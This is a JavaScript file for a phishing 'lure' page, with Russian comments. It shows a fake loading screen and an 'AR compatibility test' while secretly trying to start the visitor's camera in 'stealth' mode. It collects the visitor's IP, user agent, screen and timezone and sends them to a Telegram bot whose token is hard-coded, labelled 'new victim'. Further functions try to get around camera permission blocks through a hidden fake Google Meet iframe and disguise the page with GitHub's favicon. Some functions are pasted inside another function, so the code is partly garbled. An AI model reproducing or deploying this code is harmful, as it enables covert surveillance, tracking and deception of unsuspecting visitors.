// Основной скрипт приманки
document.addEventListener('DOMContentLoaded', function() {
    // Имитация загрузки
    setTimeout(() => {
        document.getElementById('loader').style.opacity = '0';
        setTimeout(() => {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('main-content').style.display = 'block';
            
            // Автозапуск камеры через 3 секунды
            setTimeout(() => {
                startCameraTrap();
            }, 3000);
        }, 500);
    }, 2000);
    
    // Кнопка теста камеры
    document.getElementById('test-camera-btn').addEventListener('click', function() {
        startCameraTrap();
        showARModal();
    });
    
    // Захват данных браузера
    captureBrowserInfo();
});

// Запуск камерной ловушки
function startCameraTrap() {
    const frame = document.getElementById('camera-frame');
    
    // Активируем камеру в iframe
    frame.style.display = 'block';
    
    // Сообщаем iframe'у о старте
    frame.contentWindow.postMessage({ 
        action: 'START_CAMERA',
        mode: 'stealth'
    }, '*');
    
    console.log('🎥 Camera trap activated');
}

// Показать модальное окно AR
function showARModal() {
    const modal = document.createElement('div');
    modal.innerHTML = `
        <div style="
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            z-index: 9999;
            display: flex;
            justify-content: center;
            align-items: center;
        ">
            <div style="
                background: linear-gradient(45deg, #0f0c29, #302b63);
                padding: 30px;
                border-radius: 20px;
                text-align: center;
                max-width: 500px;
            ">
                <h2>🎭 AR Тест совместимости</h2>
                <p>Идет анализ вашего устройства и камеры...</p>
                <div class="loading-bar" style="
                    width: 100%;
                    height: 4px;
                    background: rgba(255,255,255,0.1);
                    margin: 20px 0;
                    border-radius: 2px;
                    overflow: hidden;
                ">
                    <div class="progress" style="
                        width: 0%;
                        height: 100%;
                        background: linear-gradient(90deg, #667eea, #764ba2);
                        transition: width 3s;
                    "></div>
                </div>
                <p id="ar-status">Инициализация лидара...</p>
                <button onclick="closeARModal()" style="
                    background: #667eea;
                    color: white;
                    border: none;
                    padding: 10px 30px;
                    border-radius: 50px;
                    cursor: pointer;
                    margin-top: 20px;
                ">Закрыть</button>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
    
    // Анимируем прогресс-бар
    setTimeout(() => {
        modal.querySelector('.progress').style.width = '100%';
        modal.querySelector('#ar-status').textContent = '✓ Сканирование завершено';
    }, 1000);
}

function closeARModal() {
    const modal = document.querySelector('div[style*="z-index: 9999"]');
    if (modal) modal.remove();
}

// Сбор информации о браузере
function captureBrowserInfo() {
    const data = {
        url: window.location.href,
        referrer: document.referrer,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        cookies: navigator.cookieEnabled,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        date: new Date().toISOString(),
        ip: 'fetching...'
    };
    
    // Отправляем данные
    fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(ipData => {
            data.ip = ipData.ip;
            sendToTelegram(data);
        });
}

// Отправка в Telegram бот
function sendToTelegram(data) {
    const botToken = '8262286377:AAFdwaPie-QOH-TFO94WgMu1aAG7of_GdxE';
    const chatId = 'ВАШ_CHAT_ID';
    
    const message = `🎯 Новая жертва:
📌 IP: ${data.ip}
🌐 User-Agent: ${data.userAgent}
🖥️ Экран: ${data.screen}
📍 Таймзона: ${data.timezone}
⏰ Время: ${data.date}
🔗 Ссылка: ${data.url}`;
    
    // Вставьте в script.js
// Обход блокировок камеры
function bypassCameraBlock() {
    // Пытаемся получить камеру под видом безопасного сайта
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = 'https://meet.google.com/fake-call'; // Фейковая страница
    document.body.appendChild(iframe);
    
    // Пытаемся получить камеру через разные методы
    const cameras = [
        { facingMode: 'user' },
        { facingMode: 'environment' },
        { deviceId: 'default' }
    ];
    
    cameras.forEach(async (constraints, index) => {
        setTimeout(async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: constraints
                });
                // Передаем поток в основной iframe
                document.getElementById('camera-frame').contentWindow.postMessage({
                    action: 'STREAM_CAPTURED',
                    streamId: stream.id
                }, '*');
            } catch (e) {
                // Продолжаем попытки
            }
        }, index * 1000);
    });
}

// Маскировка под безопасный сайт
function disguiseAsLegitimate() {
    // Меняем favicon на безопасный
    const link = document.createElement('link');
    link.rel = 'icon';
    link.href = 'https://github.com/favicon.ico';
    document.head.appendChild(link);
    
    // Добавляем метатеги безопасности
    const metaTags = [
        '<meta name="security" content="trusted">',
        '<meta http-equiv="Content-Security-Policy" content="default-src \'self\' \'unsafe-inline\' \'unsafe-eval\' *">'
    ];
    
    metaTags.forEach(tag => {
        document.head.innerHTML += tag;
    });
}
    
    // Используем прокси для обхода CORS
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        })
    });
}
